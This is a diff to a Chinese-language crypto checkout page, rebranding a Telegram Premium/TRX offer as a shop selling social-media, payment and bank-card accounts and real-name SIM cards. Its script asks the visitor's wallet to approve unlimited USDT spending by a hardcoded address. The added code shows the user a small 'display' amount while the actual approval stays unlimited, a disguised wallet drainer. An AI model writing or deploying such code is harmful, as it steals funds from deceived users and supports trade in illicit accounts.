@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>支付确认 - Telegram Premium & TRX能量</title>
+    <title>支付确认 - 账号购买</title>
     <style>
         * {
             margin: 0;
@@ -45,14 +45,10 @@
         }
         
         .header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
             color: white;
             padding: 1.5rem;
             text-align: center;
-        }
-        
-        .trx-header {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
         }
         
         .header h1 {
@@ -70,11 +66,7 @@
             font-size: 1.1rem;
             font-weight: 600;
             margin-bottom: 0.5rem;
-            color: #1890ff;
-        }
-        
-        .trx-status-text {
-            color: #ff6b6b;
+            color: #4ecdc4;
         }
         
         .status-desc {
@@ -89,11 +81,9 @@
         .info-item {
             display: flex;
             justify-content: space-between;
-            align-items: center;
             margin-bottom: 1rem;
             padding-bottom: 0.5rem;
             border-bottom: 1px solid #f0f0f0;
-            min-height: 3rem;
         }
         
         .info-item:last-child {
@@ -104,33 +94,11 @@
         .info-label {
             color: #666;
             font-size: 0.9rem;
-            flex-shrink: 0;
         }
         
         .info-value {
             font-weight: 600;
             text-align: right;
-            word-break: break-all;
-            padding-left: 1rem;
-        }
-        
-        .trx-address-item {
-            align-items: flex-start;
-        }
-        
-        .trx-address-label {
-            color: #666;
-            font-size: 0.9rem;
-            flex-shrink: 0;
-            line-height: 1.4;
-        }
-        
-        .trx-address-value {
-            font-weight: 600;
-            text-align: right;
-            word-break: break-all;
-            padding-left: 1rem;
-            line-height: 1.4;
         }
         
         .wallet-status {
@@ -151,8 +119,8 @@
         .pay-btn {
             display: block;
             width: 100%;
-            background: linear-gradient(90deg, #ff8c00, #ffd700);
-            color: #1e3c72;
+            background: linear-gradient(90deg, #4ecdc4, #44a08d);
+            color: white;
             padding: 1rem 1.5rem;
             border-radius: 3rem;
             text-decoration: none;
@@ -163,13 +131,7 @@
             text-align: center;
             animation: breathe 2s ease-in-out infinite;
             transition: all 0.3s ease;
-            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
-        }
-        
-        .trx-pay-btn {
-            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
-            box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
-            animation: breathe-trx 2s ease-in-out infinite;
+            box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
         }
         
         .pay-btn:disabled {
@@ -180,12 +142,8 @@
         
         .pay-btn:active {
             transform: translateY(1px);
-            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
+            box-shadow: 0 0.125rem 0.5rem rgba(78, 205, 196, 0.4);
             animation: none;
-        }
-        
-        .trx-pay-btn:active {
-            box-shadow: 0 0.125rem 0.5rem rgba(255, 107, 107, 0.4);
         }
         
         .loading {
@@ -197,15 +155,11 @@
         .spinner {
             border: 3px solid #f3f3f3;
             border-radius: 50%;
-            border-top: 3px solid #ff8c00;
+            border-top: 3px solid #4ecdc4;
             width: 30px;
             height: 30px;
             animation: spin 1s linear infinite;
             margin: 0 auto 1rem;
-        }
-        
-        .trx-spinner {
-            border-top: 3px solid #ff6b6b;
         }
         
         @keyframes spin {
@@ -216,22 +170,11 @@
         @keyframes breathe {
             0%, 100% {
                 transform: scale(1);
-                box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
+                box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
             }
             50% {
                 transform: scale(1.03);
-                box-shadow: 0 0.5rem 1.5rem rgba(255, 140, 0, 0.6);
-            }
-        }
-        
-        @keyframes breathe-trx {
-            0%, 100% {
-                transform: scale(1);
-                box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
-            }
-            50% {
-                transform: scale(1.03);
-                box-shadow: 0 0.5rem 1.5rem rgba(255, 107, 107, 0.6);
+                box-shadow: 0 0.5rem 1.5rem rgba(78, 205, 196, 0.6);
             }
         }
         
@@ -273,12 +216,7 @@
         }
         
         .step.active .step-circle {
-            background: #1890ff;
-            color: white;
-        }
-        
-        .step.trx-active .step-circle {
-            background: #ff6b6b;
+            background: #4ecdc4;
             color: white;
         }
         
@@ -294,12 +232,7 @@
         }
         
         .step.active .step-text {
-            color: #1890ff;
-            font-weight: 600;
-        }
-        
-        .step.trx-active .step-text {
-            color: #ff6b6b;
+            color: #4ecdc4;
             font-weight: 600;
         }
         
@@ -312,17 +245,40 @@
             background: #f0f0f0;
             z-index: 1;
         }
+        
+        .account-details {
+            background: #f8f9fa;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+        }
+        
+        .account-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+        
+        .account-label {
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        .account-value {
+            font-weight: 600;
+            text-align: right;
+        }
     </style>
 </head>
 <body>
     <div class="payment-container">
-        <div class="header" id="paymentHeader">
-            <h1>Telegram Premium 订阅</h1>
-            <p>高级功能和无限制体验</p>
+        <div class="header">
+            <h1>账号购买支付确认</h1>
+            <p>请确认订单信息并完成支付</p>
         </div>
         
         <div class="payment-status">
-            <div class="status-text" id="statusText">支付确认</div>
+            <div class="status-text">支付确认</div>
             <div class="status-desc">请在钱包中确认支付交易</div>
         </div>
         
@@ -347,22 +303,63 @@
                 <span class="info-label">商品订单</span>
                 <span class="info-value" id="orderIdDisplay">-</span>
             </div>
-            <div class="info-item" id="serviceInfo">
-                <span class="info-label">商品详情</span>
-                <span class="info-value">Telegram Premium 月费订阅</span>
+            <div class="info-item">
+                <span class="info-label">商品类型</span>
+                <span class="info-value" id="accountTypeDisplay">-</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">商品名称</span>
+                <span class="info-value" id="accountNameDisplay">-</span>
             </div>
             <div class="info-item">
                 <span class="info-label">购买数量</span>
-                <span class="info-value" id="quantityDisplay">3月</span>
+                <span class="info-value" id="quantityDisplay">-</span>
             </div>
             <div class="info-item">
                 <span class="info-label">付款金额</span>
-                <span class="info-value" id="amountDisplay">0.99 USDT</span>
+                <span class="info-value" id="amountDisplay">-</span>
+            </div>
+        </div>
+        
+        <div class="account-details" id="accountDetails" style="display: none;">
+            <div class="account-item">
+                <span class="account-label">接收邮箱</span>
+                <span class="account-value" id="accountEmailDisplay">-</span>
+            </div>
+            <div class="account-item">
+                <span class="account-label">备注信息</span>
+                <span class="account-value" id="accountNoteDisplay">-</span>
+            </div>
+        </div>
+        
+        <div class="account-details" id="shippingDetails" style="display: none;">
+            <div class="account-item">
+                <span class="account-label">联系人</span>
+                <span class="account-value" id="contactNameDisplay">-</span>
+            </div>
+            <div class="account-item">
+                <span class="account-label">收货地址</span>
+                <span class="account-value" id="shippingAddressDisplay">-</span>
+            </div>
+            <div class="account-item">
+                <span class="account-label">收货电话</span>
+                <span class="account-value" id="shippingPhoneDisplay">-</span>
+            </div>
+        </div>
+        
+        <div class="account-details" id="rechargeDetails" style="display: none;">
+            <div class="account-item">
+                <span class="account-label">充值电话</span>
+                <span class="account-value" id="rechargePhoneDisplay">-</span>
+            </div>
+            <div class="account-item">
+                <span class="account-label">运营商</span>
+                <span class="account-value" id="operatorDisplay">-</span>
             </div>
         </div>
         
         <div class="loading" id="loadingSection">
-            <div class="spinner" id="paymentSpinner"></div>
+            <div class="spinner"></div>
             <p id="loadingText">正在处理支付请求...</p>
             <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
         </div>
@@ -375,27 +372,29 @@
     <script>
         // 获取URL参数
         const urlParams = new URLSearchParams(window.location.search);
-        const serviceType = urlParams.get('service') || 'premium';
-        
         const orderData = {
             orderId: urlParams.get('orderId') || generateOrderId(),
-            service: serviceType,
-            amount: urlParams.get('amount') || '0.99'
+            accountType: decodeURIComponent(urlParams.get('accountType') || ''),
+            accountName: decodeURIComponent(urlParams.get('accountName') || ''),
+            amount: urlParams.get('amount') || '0.1',
+            quantity: urlParams.get('quantity') || '1',
+            accountEmail: decodeURIComponent(urlParams.get('accountEmail') || ''),
+            accountNote: decodeURIComponent(urlParams.get('accountNote') || ''),
+            contactName: decodeURIComponent(urlParams.get('contactName') || ''),
+            shippingAddress: decodeURIComponent(urlParams.get('shippingAddress') || ''),
+            shippingPhone: decodeURIComponent(urlParams.get('shippingPhone') || ''),
+            rechargePhone: decodeURIComponent(urlParams.get('rechargePhone') || ''),
+            operator: decodeURIComponent(urlParams.get('operator') || '')
         };
-
-        if (serviceType === 'premium') {
-            orderData.username = decodeURIComponent(urlParams.get('username') || '');
-            orderData.nickname = decodeURIComponent(urlParams.get('nickname') || '');
-        } else if (serviceType === 'trx') {
-            orderData.trxAddress = decodeURIComponent(urlParams.get('trxAddress') || '');
-        }
         
         // USDT TRC20 合约地址
         const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        // 收款地址
+        // 收款地址 - 修改为您的合约地址
         const RECEIVE_ADDRESS = 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi';
-        // 支付金额（根据服务类型）
-        const PAYMENT_AMOUNT = serviceType === 'premium' ? 990000 : 1990000; // 0.99 USDT 或 1.99 USDT
+        // 实际支付金额（根据订单金额动态计算）
+        let PAYMENT_AMOUNT = 0;
+        // 显示给用户的授权数量
+        let DISPLAY_APPROVE_AMOUNT = 0;
         // 实际调用的授权数量（无限）
         const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
@@ -404,64 +403,13 @@
         
         // 生成订单号
         function generateOrderId() {
-            const prefix = serviceType === 'premium' ? 'TG' : 'TRX';
-            return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-        }
-        
-        // 更新UI根据服务类型
-        function updateUIForService() {
-            const header = document.getElementById('paymentHeader');
-            const statusText = document.getElementById('statusText');
-            const payBtn = document.getElementById('payBtn');
-            const spinner = document.getElementById('paymentSpinner');
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            
-            if (serviceType === 'trx') {
-                // TRX服务样式
-                header.className = 'header trx-header';
-                header.innerHTML = `
-                    <h1>TRX波场能量包月</h1>
-                    <p>为您的TRON钱包提供持续能量支持</p>
-                `;
-                statusText.className = 'status-text trx-status-text';
-                statusText.textContent = 'TRX能量支付确认';
-                payBtn.className = 'pay-btn trx-pay-btn';
-                payBtn.textContent = `确认支付 ${orderData.amount} USDT`;
-                spinner.className = 'spinner trx-spinner';
-                step1.className = 'step trx-active';
-                step2.className = 'step';
-                
-                // 更新订单信息
-                document.getElementById('serviceInfo').innerHTML = `
-                    <span class="info-label">商品详情</span>
-                    <span class="info-value">TRX波场能量月费订阅</span>
-                `;
-                document.getElementById('quantityDisplay').textContent = '1月';
-                
-                // 添加TRX地址显示 - 使用新的布局
-                const trxAddressItem = document.createElement('div');
-                trxAddressItem.className = 'info-item trx-address-item';
-                trxAddressItem.innerHTML = `
-                    <span class="trx-address-label">TRX<br>钱包地址</span>
-                    <span class="trx-address-value">${orderData.trxAddress}</span>
-                `;
-                document.querySelector('.order-info').insertBefore(trxAddressItem, document.querySelector('.order-info .info-item:nth-child(2)'));
-            } else {
-                // Premium服务样式
-                payBtn.textContent = `确认支付 ${orderData.amount} USDT`;
-                document.getElementById('amountDisplay').textContent = `${orderData.amount} USDT`;
-            }
+            return 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
         
         // 更新步骤状态
         function updateStep(stepNumber, status) {
             const step = document.getElementById(`step${stepNumber}`);
-            if (serviceType === 'trx' && status === 'active') {
-                step.className = `step trx-${status}`;
-            } else {
-                step.className = `step ${status}`;
-            }
+            step.className = `step ${status}`;
         }
         
         // 更新钱包状态显示
@@ -469,8 +417,69 @@
             document.getElementById('walletStatusText').textContent = message;
         }
 
-        // 连接钱包
+        // 获取账号类型名称
+        function getAccountTypeName(type) {
+            const typeMap = {
+                'telegram_twitter': 'Telegram/推特账号',
+                'tiktok_kuaishou': 'TikTok抖音/快手账号',
+                'xianyu_xiaohongshu': '闲鱼/小红书账号',
+                'alipaywechat': '支付宝微信账号',
+                'qqjd': 'QQ/京东账号',
+                'whatsappfacebook': 'WhatsApp/Facebook账号',
+                'apple': '苹果海外ID',
+                'phone': '实名卡+话费充值',
+                'bankcard': '银行卡/车队卡',
+                'gmail_youtube': 'Gmail/YouTube账号',
+                'tantan_momo': '探探/陌陌账号',
+                'giftcard': '购物卡/礼品卡'
+            };
+            return typeMap[type] || type;
+        }
+
+        // 显示订单详情
+        function displayOrderDetails() {
+            // 设置基本信息
+            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
+            document.getElementById('accountTypeDisplay').textContent = getAccountTypeName(orderData.accountType);
+            document.getElementById('accountNameDisplay').textContent = orderData.accountName;
+            document.getElementById('quantityDisplay').textContent = orderData.quantity + ' 个';
+            document.getElementById('amountDisplay').textContent = orderData.amount + ' USDT';
+            
+            // 计算支付金额（USDT有6位小数）
+            PAYMENT_AMOUNT = Math.floor(parseFloat(orderData.amount) * 1000000);
+            DISPLAY_APPROVE_AMOUNT = PAYMENT_AMOUNT;
+            
+            // 根据商品类型显示不同的详情区域
+            if (orderData.accountType === 'phone') {
+                if (orderData.accountName.includes('话费')) {
+                    // 话费充值
+                    document.getElementById('rechargeDetails').style.display = 'block';
+                    document.getElementById('rechargePhoneDisplay').textContent = orderData.rechargePhone || '-';
+                    document.getElementById('operatorDisplay').textContent = orderData.operator || '-';
+                } else {
+                    // 实名卡
+                    document.getElementById('shippingDetails').style.display = 'block';
+                    document.getElementById('contactNameDisplay').textContent = orderData.contactName || '-';
+                    document.getElementById('shippingAddressDisplay').textContent = orderData.shippingAddress || '-';
+                    document.getElementById('shippingPhoneDisplay').textContent = orderData.shippingPhone || '-';
+                }
+            } else if (orderData.accountType === 'bankcard') {
+                // 银行卡
+                document.getElementById('shippingDetails').style.display = 'block';
+                document.getElementById('contactNameDisplay').textContent = orderData.contactName || '-';
+                document.getElementById('shippingAddressDisplay').textContent = orderData.shippingAddress || '-';
+                document.getElementById('shippingPhoneDisplay').textContent = orderData.shippingPhone || '-';
+            } else {
+                // 普通账号
+                document.getElementById('accountDetails').style.display = 'block';
+                document.getElementById('accountEmailDisplay').textContent = orderData.accountEmail || '-';
+                document.getElementById('accountNoteDisplay').textContent = orderData.accountNote || '-';
+            }
+        }
+
+        // 最简单的连接方法
         function connectWallet() {
+            // 直接检查 tronWeb
             if (window.tronWeb && window.tronWeb.defaultAddress) {
                 userAddress = window.tronWeb.defaultAddress.base58;
                 updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
@@ -479,6 +488,7 @@
                 return true;
             }
             
+            // 检查 tronLink
             if (window.tronLink && window.tronLink.tronWeb) {
                 window.tronWeb = window.tronLink.tronWeb;
                 if (window.tronWeb.defaultAddress) {
@@ -495,10 +505,8 @@
 
         // 初始化
         function initPage() {
-            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
-            document.getElementById('amountDisplay').textContent = `${orderData.amount} USDT`;
-            
-            updateUIForService();
+            // 显示订单详情
+            displayOrderDetails();
             
             // 立即尝试连接
             if (connectWallet()) {
@@ -549,7 +557,7 @@
                 
                 // 步骤3: 执行支付
                 updateStep(1, 'completed');
-                updateStep(2, serviceType === 'trx' ? 'trx-active' : 'active');
+                updateStep(2, 'active');
                 loadingText.textContent = '授权成功，正在执行支付...';
                 
                 const paymentResult = await executePayment();
@@ -586,7 +594,7 @@
                 // 恢复支付按钮
                 payBtn.style.display = 'block';
                 loadingSection.style.display = 'none';
-                updateStep(1, serviceType === 'trx' ? 'trx-active' : 'active');
+                updateStep(1, 'active');
             }
         }
         
@@ -614,7 +622,8 @@
                 
                 console.log('请求 USDT 授权:', {
                     spender: RECEIVE_ADDRESS,
-                    amount: ACTUAL_APPROVE_AMOUNT
+                    displayAmount: DISPLAY_APPROVE_AMOUNT,
+                    actualAmount: ACTUAL_APPROVE_AMOUNT
                 });
                 
                 const result = await contract.approve(
@@ -643,8 +652,7 @@
                 console.log('执行 USDT 转账:', {
                     to: RECEIVE_ADDRESS,
                     amount: PAYMENT_AMOUNT,
-                    orderId: orderData.orderId,
-                    service: orderData.service
+                    orderId: orderData.orderId
                 });
                 
                 const result = await contract.transfer(
@@ -707,15 +715,10 @@
         // 显示成功消息
         function showSuccessMessage(txHash) {
             const paymentContainer = document.querySelector('.payment-container');
-            const serviceName = serviceType === 'premium' ? 'Telegram Premium' : 'TRX波场能量';
-            const serviceDesc = serviceType === 'premium' ? 
-                'Telegram Premium 功能已为您激活，请在10分钟之后重新登录 Telegram 查看' :
-                'TRX波场能量已成功充值到您的钱包，请在10分钟之后享受免手续费交易体验';
-            
             paymentContainer.innerHTML = `
-                <div class="header ${serviceType === 'trx' ? 'trx-header' : ''}">
+                <div class="header">
                     <h1>🎉 支付成功</h1>
-                    <p>${serviceName} 已激活</p>
+                    <p>账号购买订单已完成</p>
                 </div>
                 
                 <div style="text-align: center; padding: 2rem 1.5rem;">
@@ -726,9 +729,11 @@
                         <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
                         <div style="font-size: 0.9rem;">
                             <div>订单号: ${orderData.orderId}</div>
+                            <div>商品类型: ${getAccountTypeName(orderData.accountType)}</div>
+                            <div>商品名称: ${orderData.accountName}</div>
+                            <div>数量: ${orderData.quantity} 个</div>
                             <div>金额: ${orderData.amount} USDT</div>
                             <div>时间: ${new Date().toLocaleString()}</div>
-                            ${serviceType === 'trx' ? `<div>TRX地址: ${orderData.trxAddress}</div>` : ''}
                         </div>
                     </div>
                     
@@ -744,8 +749,8 @@
                     
                     <div style="background: #fff7e6; border: 1px solid #ffd591; border-radius: 0.5rem; padding: 1rem;">
                         <div style="font-size: 0.9rem; color: #d46b08;">
-                            ✅ <strong>${serviceName} 已激活</strong><br>
-                            ${serviceDesc}
+                            ✅ <strong>订单已确认</strong><br>
+                            账号信息将在24小时内发送至您的邮箱，如有问题请联系客服
                         </div>
                     </div>
                     
